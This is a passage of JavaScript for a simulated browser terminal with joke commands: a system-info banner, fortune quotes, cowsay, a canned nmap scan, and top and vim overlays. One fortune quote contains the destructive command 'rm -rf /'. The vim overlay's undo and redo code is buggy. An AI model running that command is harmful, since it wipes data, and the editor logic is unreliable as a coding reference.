            ' ██████╔╝██║███████║   ██║   ██║  ██║██║╚██████╗   ██║   ',
            ' ╚═════╝ ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝ ╚═════╝   ╚═╝  ',
        ];
        const info = [
            ['OS',       'Synth District Linux 1.0 (Neon) x86_64'],
            ['Kernel',   '6.6.0-synth-district'],
            ['Shell',    'bash 5.2.15'],
            ['Terminal', 'xterm-256color'],
            ['CPU',      'Intel Core i7-13700K (16) @ 3.400GHz'],
            ['GPU',      'NVIDIA GeForce RTX 4070 Ti'],
            ['Memory',   `${(Math.random()*2000+1500).toFixed(0)}MiB / 32768MiB`],
            ['Uptime',   uptimeStr],
            ['Packages', '1842 (dpkg)'],
            ['Resolution', `${window.screen.width}x${window.screen.height}`],
        ];

        const maxLogo = logo.length;
        for (let i = 0; i < Math.max(maxLogo, info.length); i++) {
            const logoLine = logo[i] ? `<span class="ansi-fg-cyan">${esc(logo[i])}</span>` : ' '.repeat(45);
            const infoLine = info[i]
                ? `  <span class="ansi-fg-bright-white ansi-bold">${esc(info[i][0])}</span>: <span class="ansi-fg-white">${esc(info[i][1])}</span>`
                : '';
            ctx.term.println(logoLine + infoLine);
        }
        ctx.term.println('');
        // Color blocks
        const colors = ['ansi-bg-black','ansi-bg-red','ansi-bg-green','ansi-bg-yellow','ansi-bg-blue','ansi-bg-magenta','ansi-bg-cyan','ansi-bg-white'];
        ctx.term.println(' ' + colors.map(c2 => `<span class="${c2}">   </span>`).join(''));
        return { exitCode: 0 };
    }

    /* ── fortune ── */
    async function fortune(ctx) {
        const quotes = [
            "Real programmers don't document. If it was hard to write, it should be hard to understand.",
            "There are only two kinds of programming languages: the ones people complain about and the ones nobody uses. — Bjarne Stroustrup",
            "It works on my machine.\n\t— Every developer, always",
            "The best thing about a boolean is even if you are wrong, you are only off by a bit.",
            "A user interface is like a joke. If you have to explain it, it's not that good.",
            "Unix is user-friendly. It's just very selective about who it considers a user.",
            "Talk is cheap. Show me the code. — Linus Torvalds",
            "Debugging is twice as hard as writing the code in the first place. Therefore, if you write the code as cleverly as possible, you are, by definition, not smart enough to debug it. — Brian W. Kernighan",
            "Any fool can write code that a computer can understand. Good programmers write code that humans can understand. — Martin Fowler",
            "First, solve the problem. Then, write the code. — John Johnson",
            "Experience is the name everyone gives to their mistakes. — Oscar Wilde",
            "To iterate is human, to recurse divine. — L. Peter Deutsch",
            "The computer was born to solve problems that did not exist before. — Bill Gates",
            "It's not a bug — it's an undocumented feature.",
            "You can't trust code that you did not totally create yourself. — Ken Thompson",
            "Programs must be written for people to read, and only incidentally for machines to execute. — Harold Abelson",
            "The most important property of a program is whether it accomplishes the intention of its user. — C.A.R. Hoare",
            "Walking on water and developing software from a specification are easy if both are frozen.",
            "sudo make me a sandwich.\n\t— Anonymous",
            "rm -rf / is not a solution. It's a lifestyle.",
            "Have you tried turning it off and on again?",
            "There are 10 kinds of people in this world: those who understand binary, and those who don't.",
            "UNIX is basically a simple operating system, but you have to be a genius to understand the simplicity. — Dennis Ritchie",
            "C makes it easy to shoot yourself in the foot; C++ makes it harder, but when you do it blows your whole leg off. — Bjarne Stroustrup",
            "Every great developer you know got there by solving problems they were unqualified to solve until they did it.",
            "Synth District: where the neons never dim and the terminals never close.",
            "The terminal is not a place. It's a state of mind.",
            "Whoever said 'no question is a stupid question' never watched someone type 'google.com' into the address bar of Google Chrome.",
            "chmod 777 is almost never the answer.",
            "Keep it simple, stupid. — Kelly Johnson",
        ];
        const q = quotes[Math.floor(Math.random() * quotes.length)];
        ctx.term.println('');
        q.split('\n').forEach(l => ctx.term.println(esc(l)));
        ctx.term.println('');
        return { exitCode: 0 };
    }

    /* ── cowsay ── */
    async function cowsay(text, ctx) {
        const words = text.split(' ');
        const lineLen = 40;
        const lines = [];
        let cur = '';
        for (const w of words) {
            if (cur.length + w.length + 1 > lineLen) { lines.push(cur); cur = w; }
            else cur = cur ? cur + ' ' + w : w;
        }
        if (cur) lines.push(cur);
        const maxW = Math.max(...lines.map(l => l.length));
        const border = ' ' + '_'.repeat(maxW + 2);
        ctx.term.println(esc(border));
        if (lines.length === 1) {
            ctx.term.println(esc(`< ${lines[0].padEnd(maxW)} >`));
        } else {
            lines.forEach((line, i) => {
                const padded = line.padEnd(maxW);
                if (i === 0) ctx.term.println(esc(`/ ${padded} \\`));
                else if (i === lines.length - 1) ctx.term.println(esc(`\\ ${padded} /`));
                else ctx.term.println(esc(`| ${padded} |`));
            });
        }
        ctx.term.println(esc(' ' + '-'.repeat(maxW + 2)));
        ctx.term.println(esc('        \\   ^__^'));
        ctx.term.println(esc('         \\  (oo)\\_______'));
        ctx.term.println(esc('            (__)\\       )\\/\\'));
        ctx.term.println(esc('                ||----w |'));
        ctx.term.println(esc('                ||     ||'));
        return { exitCode: 0 };
    }

    /* ── nmap ── */
    async function nmap(args, ctx) {
        const target = args.find(a => !a.startsWith('-')) || 'localhost';
        ctx.term.println(esc(`Starting Nmap 7.94 ( https://nmap.org ) at ${new Date().toISOString().slice(0,19)}`));
        ctx.term.println(esc(`Nmap scan report for ${target} (127.0.0.1)`));
        await delay(1200, ctx.signal);
        ctx.term.println(esc('Host is up (0.000072s latency).'));
        ctx.term.println(esc('Not shown: 992 closed tcp ports (reset)'));
        ctx.term.println(c('PORT      STATE SERVICE         VERSION', 'ansi-fg-bright-white ansi-bold'));
        const ports = [
            ['22/tcp',   'open', 'ssh',    'OpenSSH 9.2p1'],
            ['80/tcp',   'open', 'http',   'nginx 1.24.0'],
            ['443/tcp',  'open', 'https',  'nginx 1.24.0'],
            ['3000/tcp', 'open', 'http',   'Node.js Express'],
            ['5432/tcp', 'open', 'postgresql', 'PostgreSQL 15.4'],
            ['6379/tcp', 'open', 'redis',  'Redis key-value store'],
        ];
        for (const [port, state, svc, ver] of ports) {
            await delay(100, ctx.signal);
            ctx.term.println(esc(`${port.padEnd(10)} ${state.padEnd(6)} ${svc.padEnd(16)} ${ver}`));
        }
        ctx.term.println('');
        ctx.term.println(esc('Service detection performed. Please report any incorrect results.'));
        ctx.term.println(esc(`Nmap done: 1 IP address (1 host up) scanned in ${(1.2 + Math.random()).toFixed(2)} seconds`));
        return { exitCode: 0 };
    }

    /* ── top overlay ── */
    async function top(ctx) {
        return new Promise(resolve => {
            const overlay = document.createElement('div');
            overlay.className = 'term-overlay';
            overlay.id = 'top-overlay';
            document.body.appendChild(overlay);

            const procs = [
                { pid: 1,    user: 'root',     cpu: 0.0,  mem: 0.1, vsz: 33584,  rss: 3808,  cmd: '/sbin/init' },
                { pid: 312,  user: 'root',     cpu: 0.0,  mem: 0.3, vsz: 47832,  rss: 12244, cmd: '/usr/sbin/sshd' },
                { pid: 892,  user: 'www-data', cpu: 0.2,  mem: 0.5, vsz: 112432, rss: 20480, cmd: 'nginx: master' },
                { pid: 893,  user: 'www-data', cpu: 0.1,  mem: 0.4, vsz: 112944, rss: 16384, cmd: 'nginx: worker' },
                { pid: 921,  user: 'root',     cpu: 0.0,  mem: 0.1, vsz: 35200,  rss: 4096,  cmd: '/usr/sbin/cron' },
                { pid: 1024, user: 'user',     cpu: 0.1,  mem: 0.8, vsz: 512432, rss: 32168, cmd: '-bash' },
                { pid: 1025, user: 'user',     cpu: 2.1,  mem: 0.1, vsz: 13568,  rss: 4096,  cmd: 'top' },
            ];

            function row(html) { return `<div style="white-space:pre;">${html}</div>`; }

            function render() {
                const now = new Date();
                const ts = now.toTimeString().slice(0,8);
                const mem_used = 8192 + Math.floor(Math.random() * 200);
                const load = (Math.random() * 0.5 + 0.1).toFixed(2);
                procs.forEach(p => { if (p.pid !== 1) p.cpu = Math.max(0, p.cpu + (Math.random() - 0.5) * 0.5); });

                const sorted = [...procs].sort((a, b) => b.cpu - a.cpu);
                const procRows = sorted.map(p => {
                    const cpuStr = p.cpu.toFixed(1).padStart(5);
                    const memStr = p.mem.toFixed(1).padStart(5);
                    const color = p.cpu > 1 ? 'ansi-fg-yellow' : '';
                    const timeStr = `0:${(Math.random() * 60).toFixed(2)}`.padStart(9);
                    const line = `${String(p.pid).padStart(7)} ${p.user.padEnd(9)}  20   0 ${String(p.vsz).padStart(7)} ${String(p.rss).padStart(6)} ${String(Math.floor(p.rss * 0.3)).padStart(6)} S${cpuStr}${memStr} ${timeStr} ${p.cmd}`;
                    return row(color ? `<span class="${color}">${line}</span>` : line);
                }).join('');

                overlay.innerHTML =
                    `<div style="padding:4px 8px 32px 8px;overflow:hidden;">` +
                    row(`<span class="ansi-fg-bright-white ansi-bold">top - ${ts} up 1:12,  1 user,  load average: ${load}, ${(+load+0.05).toFixed(2)}, ${(+load+0.02).toFixed(2)}</span>`) +
                    row(`Tasks: <span class="ansi-fg-bright-white">28</span> total,   <span class="ansi-fg-bright-white">1</span> running,  <span class="ansi-fg-bright-white">27</span> sleeping,   <span class="ansi-fg-bright-white">0</span> stopped,   <span class="ansi-fg-bright-white">0</span> zombie`) +
                    row(`%Cpu(s): <span class="ansi-fg-bright-white">${(Math.random()*5+1).toFixed(1)}</span> us,  <span class="ansi-fg-bright-white">${(Math.random()*2).toFixed(1)}</span> sy,  <span class="ansi-fg-bright-white">0.0</span> ni, <span class="ansi-fg-bright-white">${(90+Math.random()*5).toFixed(1)}</span> id,  <span class="ansi-fg-bright-white">0.0</span> wa,  <span class="ansi-fg-bright-white">0.0</span> hi,  <span class="ansi-fg-bright-white">0.0</span> si,  <span class="ansi-fg-bright-white">0.0</span> st`) +
                    row(`MiB Mem : <span class="ansi-fg-bright-white">32768.0</span> total,  <span class="ansi-fg-bright-white">${(32768-mem_used-7000).toFixed(1)}</span> free,  <span class="ansi-fg-bright-white">${mem_used.toFixed(1)}</span> used,  <span class="ansi-fg-bright-white">7341.0</span> buff/cache`) +
                    row(`MiB Swap:  <span class="ansi-fg-bright-white">8192.0</span> total,  <span class="ansi-fg-bright-white">8192.0</span> free,     <span class="ansi-fg-bright-white">0.0</span> used. <span class="ansi-fg-bright-white">22020.5</span> avail Mem`) +
                    `<div>&nbsp;</div>` +
                    `<div style="white-space:pre;background:#1d4f7c;color:#e8e8e8;font-weight:bold;">    PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ COMMAND         </div>` +
                    procRows +
                    `</div>` +
                    `<div style="position:absolute;bottom:0;left:0;right:0;padding:2px 8px;background:#373b41;font-size:12px;white-space:pre;">` +
                    `Press <span class="ansi-fg-yellow ansi-bold">q</span> to quit | <span class="ansi-fg-yellow">k</span> kill | <span class="ansi-fg-yellow">1</span> CPU cores | <span class="ansi-fg-yellow">m</span> mem | <span class="ansi-dim">top - Synth District Linux</span>` +
                    `</div>`;
            }

            render();
            const interval = setInterval(render, 2000);

            const onKey = (e) => {
                if (e.key === 'q' || e.key === 'Q') {
                    clearInterval(interval);
                    overlay.remove();
                    document.removeEventListener('keydown', onKey);
                    resolve({ exitCode: 0 });
                }
            };
            setTimeout(() => document.addEventListener('keydown', onKey), 100);
        });
    }

    /* ── vim overlay ── */
    async function vim(filepath, ctx) {
        return new Promise(resolve => {
            const fs = ctx.fs;
            let content = '';
            let absPath = null;
            if (filepath) {
                absPath = fs.resolve(filepath);
                const existing = fs.readFile(absPath);
                content = existing || '';
            }

            const lines = content.split('\n');
            let cursorLine = 0, cursorCol = 0;
            let mode = 'normal';
            let pendingOp = null;
            let pendingCount = '';
            let cmdBuf = '';
            let searchBuf = '';
            let searchDir = '';
            let searchMatches = [];
            let searchIdx = -1;
            let visualMode = null;
            let visualAnchor = null;
            let undoStack = [];
            let redoStack = [];
            let registers = { '"': '' };
            let marks = {};
            let lastFindChar = '';
            let lastFindForward = true;
            let statusMsg = '';
            let settings = { number: false, hlsearch: true, ignorecase: false, tabstop: 4, expandtab: false };
            let saved = true;

            const overlay = document.createElement('div');
            overlay.className = 'term-overlay';
            overlay.id = 'vim-overlay';
            document.body.appendChild(overlay);

            function snapshot() { return { lines: JSON.parse(JSON.stringify(lines)), cursorLine, cursorCol }; }
            function saveState() { undoStack.push(snapshot()); redoStack = []; saved = false; }

            function moveWord(dir, isWord) {
                const line = lines[cursorLine] || '';
                let col = cursorCol;
                const isWordChar = c => /[a-zA-Z0-9_]/.test(c);
                const nextCol = (start, d) => {
                    let c = start + d;
                    while (c >= 0 && c < line.length) { if (isWord ? isWordChar(line[c]) : !/\s/.test(line[c])) break; c += d; }
                    while (c >= 0 && c < line.length && (isWord ? isWordChar(line[c]) : !/\s/.test(line[c]))) c += d;
                    return c;
                };
                cursorCol = dir > 0 ? nextCol(col, 1) : nextCol(col - 1, -1);
                cursorCol = Math.max(0, Math.min(cursorCol, line.length - 1));
            }

            function selectRange(startLine, startCol, endLine, endCol) {
                const result = { lines: [], startLine, startCol, endLine, endCol };
                if (startLine === endLine) {
                    const min = Math.min(startCol, endCol);
                    const max = Math.max(startCol, endCol);
                    result.lines = [lines[startLine].slice(min, max + 1)];
                } else {
                    result.lines = [lines[startLine].slice(startCol)];
                    for (let i = startLine + 1; i < endLine; i++) result.lines.push(lines[i]);
                    result.lines.push(lines[endLine].slice(0, endCol + 1));
                }
                return result;
            }

            function findMatches(pattern, dir) {
                searchMatches = [];
                try {
                    const regex = new RegExp(pattern, settings.ignorecase ? 'gi' : 'g');
                    for (let l = 0; l < lines.length; l++) {
                        let match;
                        while ((match = regex.exec(lines[l])) !== null) {
                            searchMatches.push({ line: l, start: match.index, end: match.index + match[0].length - 1 });
                        }
                    }
                } catch (e) { statusMsg = `E485: Can't read file "${pattern}"`; }
                if (searchMatches.length === 0) { statusMsg = `Pattern not found: ${pattern}`; return; }
                searchIdx = searchMatches.findIndex(m => m.line > cursorLine || (m.line === cursorLine && m.start >= cursorCol));
                if (searchIdx === -1) searchIdx = 0;
                const match = searchMatches[searchIdx];
                cursorLine = match.line;
                cursorCol = match.start;
            }

            function deleteOp(motion) {
                const end = motion();
                const range = selectRange(cursorLine, cursorCol, end.line, end.col);
                registers['"'] = range.lines.join('\n');
                if (cursorLine === end.line) {
                    lines[cursorLine] = lines[cursorLine].slice(0, Math.min(cursorCol, end.col)) + lines[cursorLine].slice(Math.max(cursorCol, end.col) + 1);
                } else {
                    const before = lines[cursorLine].slice(0, cursorCol);
                    const after = lines[end.line].slice(end.col + 1);
                    lines[cursorLine] = before + after;
                    for (let i = end.line; i > cursorLine; i--) lines.splice(i, 1);
                }
            }

            function changeOp(motion) { deleteOp(motion); mode = 'insert'; }

            function yankOp(motion) {
                const end = motion();
                const range = selectRange(cursorLine, cursorCol, end.line, end.col);
                registers['"'] = range.lines.join('\n');
                statusMsg = `yanked ${registers['"'].length} characters`;
            }

            function executeCmd(cmd) {
                cmd = cmd.trim();
                if (cmd === 'q' || cmd === 'q!') { overlay.remove(); document.removeEventListener('keydown', onKey); resolve({ exitCode: 0 }); return true; }
                if (cmd === 'wq' || cmd === 'x' || cmd === 'wq!') { if (absPath) fs.writeFile(absPath, lines.join('\n')); overlay.remove(); document.removeEventListener('keydown', onKey); resolve({ exitCode: 0 }); return true; }
                if (cmd === 'w') { if (absPath) { fs.writeFile(absPath, lines.join('\n')); statusMsg = `"${filepath}" written`; saved = true; } return false; }
                if (cmd.startsWith('w ')) { const path = fs.resolve(cmd.slice(2).trim()); fs.writeFile(path, lines.join('\n')); statusMsg = `"${cmd.slice(2).trim()}" written`; return false; }
                if (cmd === 'e!' && absPath) { const c = fs.readFile(absPath); lines.splice(0, lines.length, ...c.split('\n')); saved = true; return false; }
                if (cmd.startsWith('e ')) { const p = fs.resolve(cmd.slice(2).trim()); const c = fs.readFile(p); if (c !== null) { lines.splice(0, lines.length, ...c.split('\n')); absPath = p; filepath = cmd.slice(2).trim(); saved = true; } return false; }
                if (cmd.startsWith('set ')) { const opt = cmd.slice(4); if (opt === 'number' || opt === 'nu') settings.number = true; else if (opt === 'nonumber') settings.number = false; else if (opt === 'hlsearch') settings.hlsearch = true; else if (opt === 'nohlsearch') settings.hlsearch = false; else if (opt === 'ignorecase' || opt === 'ic') settings.ignorecase = true; else statusMsg = `E492: Not an editor command: ${cmd}`; return false; }
                if (cmd === 'nohl' || cmd === 'nohlsearch') { searchMatches = []; searchIdx = -1; return false; }
                if (/^:?%?s\//.test(cmd)) {
                    const parts = cmd.match(/^:?%?s\/(.*?)\/(.*?)\/([gi]*)$/);
                    if (parts) {
                        const pattern = parts[1], repl = parts[2], flags = parts[3];
                        try { const regex = new RegExp(pattern, flags.includes('g') ? (settings.ignorecase ? 'gi' : 'g') : (settings.ignorecase ? 'i' : '')); for (let i = 0; i < lines.length; i++) lines[i] = lines[i].replace(regex, repl); statusMsg = 'substitution done'; } catch (e) { statusMsg = `E486: Pattern not found: ${pattern}`; }
                    } else statusMsg = `E492: Not an editor command: ${cmd}`;
                    return false;
                }
                if (/^\d+$/.test(cmd)) { cursorLine = Math.max(0, Math.min(parseInt(cmd) - 1, lines.length - 1)); return false; }
                statusMsg = `E492: Not an editor command: ${cmd}`;
                return false;
            }

            function render() {
                const visLines = Math.floor(window.innerHeight / 20) - 3;
                const startLine = Math.max(0, cursorLine - Math.floor(visLines / 2));
                let html = `<div class="vim-content">`;

                for (let i = 0; i < visLines; i++) {
                    const li = startLine + i;
                    const isCursor = li === cursorLine;
                    let lineHtml = '';
                    if (settings.number) lineHtml += `<span class="vim-gutter">${String(li + 1).padStart(4)}</span>`;

                    if (li < lines.length) {
                        const line = lines[li];
                        if (visualMode && visualAnchor) {
                            let vStart = Math.min(cursorCol, visualAnchor.col);
                            let vEnd = Math.max(cursorCol, visualAnchor.col);
                            if (visualMode === 'line') {
                                lineHtml += `<span class="vim-visual">${esc(line)}</span>`;
                            } else {
                                lineHtml += esc(line.slice(0, vStart)) + `<span class="vim-visual">${esc(line.slice(vStart, vEnd + 1))}</span>` + esc(line.slice(vEnd + 1));
                            }
                        } else {
                            const searchMatch = searchMatches.find(m => m.line === li);
                            if (searchMatch && settings.hlsearch) {
                                lineHtml += esc(line.slice(0, searchMatch.start)) + `<span class="vim-search-match">${esc(line.slice(searchMatch.start, searchMatch.end + 1))}</span>` + esc(line.slice(searchMatch.end + 1));
                            } else {
                                lineHtml += esc(line);
                            }
                        }

                        if (isCursor && mode !== 'insert' && !visualMode) {
                            const before = esc(line.slice(0, cursorCol));
                            const cur = esc(line[cursorCol] || ' ');
                            const after = esc(line.slice(cursorCol + 1));
                            lineHtml = (settings.number ? `<span class="vim-gutter">${String(li + 1).padStart(4)}</span>` : '') + before + `<span class="ansi-bg-white ansi-fg-black">${cur}</span>` + after;
                        }
                    } else {
                        lineHtml += `<span class="vim-tildes">~</span>`;
                    }
                    html += `<div class="vim-line${isCursor ? ' vim-cursor-line' : ''}">${lineHtml}</div>`;
                }
                html += '</div>';

                let modeStr = '';
                if (mode === 'insert') modeStr = '-- INSERT --';
                else if (mode === 'replace') modeStr = '-- REPLACE --';
                else if (visualMode === 'char') modeStr = '-- VISUAL --';
                else if (visualMode === 'line') modeStr = '-- VISUAL LINE --';
                else if (visualMode === 'block') modeStr = '-- VISUAL BLOCK --';
                else if (mode === 'search') modeStr = `<span class="vim-search-mode">${searchDir}</span>`;

                const pct = lines.length > 0 ? Math.round((cursorLine + 1) / lines.length * 100) : 0;
                const dirty = saved ? '' : ' <span class="vim-dirty">[modified]</span>';
                html += `<div class="vim-statusbar"><span class="vim-mode">${modeStr}</span><span>${esc(filepath || '[No Name]')}${dirty} &nbsp; ${cursorLine+1},${cursorCol+1} &nbsp; ${pct}%</span></div>`;

                if (mode === 'command') html += `<div class="vim-cmdline">:${esc(cmdBuf)}</div>`;
                else if (mode === 'search') html += `<div class="vim-cmdline">${esc(searchDir + searchBuf)}</div>`;
                else html += `<div class="vim-cmdline">${esc(statusMsg)}</div>`;

                overlay.innerHTML = html;
            }

            render();

            function onKey(e) {
                if (mode === 'command' || mode === 'search') {
                    if (e.key === 'Escape') { mode = 'normal'; cmdBuf = ''; searchBuf = ''; statusMsg = ''; }
                    else if (e.key === 'Enter') {
                        if (mode === 'command') {
                            if (executeCmd(cmdBuf)) return;
                            mode = 'normal'; cmdBuf = '';
                        } else if (mode === 'search') {
                            findMatches(searchBuf, searchDir); mode = 'normal'; searchBuf = '';
                        }
                    } else if (e.key === 'Backspace') { if (mode === 'command') cmdBuf = cmdBuf.slice(0, -1); else searchBuf = searchBuf.slice(0, -1); }
                    else if (e.key.length === 1) { if (mode === 'command') cmdBuf += e.key; else searchBuf += e.key; }
                    e.preventDefault();
                } else if (mode === 'insert') {
                    if (e.key === 'Escape') { mode = 'normal'; cursorCol = Math.max(0, cursorCol - 1); }
                    else if (e.key === 'Enter') { const rest = (lines[cursorLine]||'').slice(cursorCol); lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol); lines.splice(cursorLine + 1, 0, rest); cursorLine++; cursorCol = 0; }
                    else if (e.key === 'Tab') { lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol) + (settings.expandtab ? ' '.repeat(settings.tabstop) : '\t') + (lines[cursorLine]||'').slice(cursorCol); cursorCol += settings.expandtab ? settings.tabstop : 1; }
                    else if (e.key === 'Backspace') {
                        if (cursorCol > 0) { lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol - 1) + (lines[cursorLine]||'').slice(cursorCol); cursorCol--; }
                        else if (cursorLine > 0) { lines[cursorLine - 1] += (lines[cursorLine]||''); lines.splice(cursorLine, 1); cursorLine--; cursorCol = lines[cursorLine].length; }
                    }
                    else if (e.key === 'ArrowUp') cursorLine = Math.max(0, cursorLine - 1);
                    else if (e.key === 'ArrowDown') cursorLine = Math.min(lines.length - 1, cursorLine + 1);
                    else if (e.key === 'ArrowLeft') cursorCol = Math.max(0, cursorCol - 1);
                    else if (e.key === 'ArrowRight') cursorCol = Math.min((lines[cursorLine]||'').length, cursorCol + 1);
                    else if (e.key.length === 1) { lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol) + e.key + (lines[cursorLine]||'').slice(cursorCol); cursorCol++; }
                    e.preventDefault();
                } else if (mode === 'normal') {
                    const key = e.key;
                    if (key >= '0' && key <= '9') { pendingCount += key; }
                    else if (key === 'Escape') { pendingOp = null; pendingCount = ''; }
                    else if (key === ':') { mode = 'command'; cmdBuf = ''; e.preventDefault(); }
                    else if (key === '/') { mode = 'search'; searchDir = '/'; searchBuf = ''; e.preventDefault(); }
                    else if (key === '?') { mode = 'search'; searchDir = '?'; searchBuf = ''; e.preventDefault(); }
                    else if (key === 'i') { saveState(); mode = 'insert'; }
                    else if (key === 'I') { saveState(); cursorCol = 0; mode = 'insert'; }
                    else if (key === 'a') { saveState(); cursorCol = Math.min(cursorCol + 1, (lines[cursorLine]||'').length); mode = 'insert'; }
                    else if (key === 'A') { saveState(); cursorCol = (lines[cursorLine]||'').length; mode = 'insert'; }
                    else if (key === 'o') { saveState(); lines.splice(cursorLine + 1, 0, ''); cursorLine++; cursorCol = 0; mode = 'insert'; }
                    else if (key === 'O') { saveState(); lines.splice(cursorLine, 0, ''); cursorCol = 0; mode = 'insert'; }
                    else if (key === 'h' || key === 'ArrowLeft') { cursorCol = Math.max(0, cursorCol - 1); }
                    else if (key === 'j' || key === 'ArrowDown') { cursorLine = Math.min(lines.length - 1, cursorLine + 1); }
                    else if (key === 'k' || key === 'ArrowUp') { cursorLine = Math.max(0, cursorLine - 1); }
                    else if (key === 'l' || key === 'ArrowRight') { cursorCol = Math.min((lines[cursorLine]||'').length - 1, cursorCol + 1); }
                    else if (key === 'w') { moveWord(1, true); }
                    else if (key === 'b') { moveWord(-1, true); }
                    else if (key === 'e') { moveWord(1, true); cursorCol = Math.min(cursorCol + 1, (lines[cursorLine]||'').length - 1); }
                    else if (key === 'g') { pendingOp = 'g'; }
                    else if (key === 'G') { cursorLine = lines.length - 1; }
                    else if (key === '0') { cursorCol = 0; }
                    else if (key === '^') { const line = lines[cursorLine] || ''; cursorCol = line.search(/\S/); if (cursorCol === -1) cursorCol = 0; }
                    else if (key === '$') { cursorCol = Math.max(0, (lines[cursorLine]||'').length - 1); }
                    else if (key === 'n') { if (searchMatches.length > 0) { searchIdx = (searchIdx + 1) % searchMatches.length; const m = searchMatches[searchIdx]; cursorLine = m.line; cursorCol = m.start; } }
                    else if (key === 'N') { if (searchMatches.length > 0) { searchIdx = (searchIdx - 1 + searchMatches.length) % searchMatches.length; const m = searchMatches[searchIdx]; cursorLine = m.line; cursorCol = m.start; } }
                    else if (key === '*') { const word = (lines[cursorLine]||'').match(/\w+/); if (word) findMatches(word[0], '/'); }
                    else if (key === 'v') { visualMode = visualMode === 'char' ? null : 'char'; visualAnchor = visualMode ? { line: cursorLine, col: cursorCol } : null; }
                    else if (key === 'V') { visualMode = visualMode === 'line' ? null : 'line'; visualAnchor = visualMode ? { line: cursorLine, col: 0 } : null; }
                    else if (key === 'd') { saveState(); if (pendingOp === 'd') { lines.splice(cursorLine, 1); if (!lines.length) lines.push(''); cursorLine = Math.min(cursorLine, lines.length - 1); pendingOp = null; } else pendingOp = 'd'; }
                    else if (key === 'c') { saveState(); pendingOp = 'c'; }
                    else if (key === 'y') { saveState(); pendingOp = 'y'; }
                    else if (key === 'p') { const newLines = (registers['"'] || '').split('\n'); lines.splice(cursorLine + 1, 0, ...newLines); statusMsg = `${newLines.length} lines pasted`; }
                    else if (key === 'P') { const newLines = (registers['"'] || '').split('\n'); lines.splice(cursorLine, 0, ...newLines); statusMsg = `${newLines.length} lines pasted`; }
                    else if (key === 'x') { saveState(); lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol) + (lines[cursorLine]||'').slice(cursorCol + 1); }
                    else if (key === 'X') { saveState(); if (cursorCol > 0) { lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol - 1) + (lines[cursorLine]||'').slice(cursorCol); cursorCol--; } }
                    else if (key === 'r') { pendingOp = 'r'; }
                    else if (key === 's') { saveState(); lines[cursorLine] = (lines[cursorLine]||'').slice(0, cursorCol) + (lines[cursorLine]||'').slice(cursorCol + 1); mode = 'insert'; }
                    else if (key === 'S') { saveState(); lines[cursorLine] = ''; cursorCol = 0; mode = 'insert'; }
                    else if (key === 'J') { saveState(); if (cursorLine < lines.length - 1) { lines[cursorLine] += ' ' + (lines[cursorLine + 1] || ''); lines.splice(cursorLine + 1, 1); } }
                    else if (key === 'u') { if (undoStack.length > 0) { redoStack.push(snapshot()); const state = undoStack.pop(); Object.assign({ lines, cursorLine, cursorCol }, state); lines = state.lines; cursorLine = state.cursorLine; cursorCol = state.cursorCol; } }
                    else if (key === 'Control' && e.ctrlKey && key === 'r') { if (redoStack.length > 0) { undoStack.push(snapshot()); const state = redoStack.pop(); Object.assign({ lines, cursorLine, cursorCol }, state); lines = state.lines; cursorLine = state.cursorLine; cursorCol = state.cursorCol; } }
                    else if (key === 'Z' && pendingOp === 'Z') { if (key === 'Z') { if (absPath) fs.writeFile(absPath, lines.join('\n')); overlay.remove(); document.removeEventListener('keydown', onKey); resolve({ exitCode: 0 }); } else if (key === 'Q') { overlay.remove(); document.removeEventListener('keydown', onKey); resolve({ exitCode: 0 }); } pendingOp = null; }
                    else if (key === 'Z') { pendingOp = 'Z'; }
                    else if (pendingOp === 'g' && key === 'g') { cursorLine = 0; cursorCol = 0; pendingOp = null; }
                    else if (pendingOp === 'd' && (key === 'w' || key === 'e' || key === 'j' || key === 'k' || key === '$' || key === '0' || key === '^' || key === 'd')) {
                        if (key === 'd') { lines.splice(cursorLine, 1); if (!lines.length) lines.push(''); cursorLine = Math.min(cursorLine, lines.length - 1); statusMsg = '1 line deleted'; pendingOp = null; }
                        else {
                            const motions = {
                                'w': () => { moveWord(1, true); return { line: cursorLine, col: cursorCol }; },
                                'e': () => { moveWord(1, true); cursorCol = Math.min(cursorCol, (lines[cursorLine]||'').length - 1); return { line: cursorLine, col: cursorCol }; },
                                'j': () => ({ line: Math.min(lines.length - 1, cursorLine + 1), col: cursorCol }),
                                'k': () => ({ line: Math.max(0, cursorLine - 1), col: cursorCol }),
                                '$': () => ({ line: cursorLine, col: Math.max(0, (lines[cursorLine]||'').length - 1) }),
                                '0': () => ({ line: cursorLine, col: 0 }),
                                '^': () => { const line = lines[cursorLine] || ''; const col = line.search(/\S/); return { line: cursorLine, col: col === -1 ? 0 : col }; }
                            };
                            deleteOp(motions[key]); pendingOp = null;
                        }
                    }
                    else if (pendingOp === 'c' && (key === 'w' || key === 'e' || key === 'j' || key === 'k' || key === '$' || key === '0' || key === '^' || key === 'c')) {
                        if (key === 'c') { lines[cursorLine] = ''; cursorCol = 0; mode = 'insert'; pendingOp = null; }
                        else {
                            const motions = {
                                'w': () => { moveWord(1, true); return { line: cursorLine, col: cursorCol }; },
                                'e': () => { moveWord(1, true); cursorCol = Math.min(cursorCol, (lines[cursorLine]||'').length - 1); return { line: cursorLine, col: cursorCol }; },
                                'j': () => ({ line: Math.min(lines.length - 1, cursorLine + 1), col: cursorCol }),
                                'k': () => ({ line: Math.max(0, cursorLine - 1), col: cursorCol }),
                                '$': () => ({ line: cursorLine, col: Math.max(0, (lines[cursorLine]||'').length - 1) }),
                                '0': () => ({ line: cursorLine, col: 0 }),
                                '^': () => { const line = lines[cursorLine] || ''; const col = line.search(/\S/); return { line: cursorLine, col: col === -1 ? 0 : col }; }
                            };
                            changeOp(motions[key]); pendingOp = null;
                        }
                    }
                    else if (pendingOp === 'y' && (key === 'w' || key === 'e' || key === 'j' || key === 'k' || key === '$' || key === '0' || key === '^' || key === 'y')) {
                        if (key === 'y') { registers['"'] = lines[cursorLine]; statusMsg = `yanked line`; pendingOp = null; }
                        else {
                            const motions = {
                                'w': () => { moveWord(1, true); return { line: cursorLine, col: cursorCol }; },
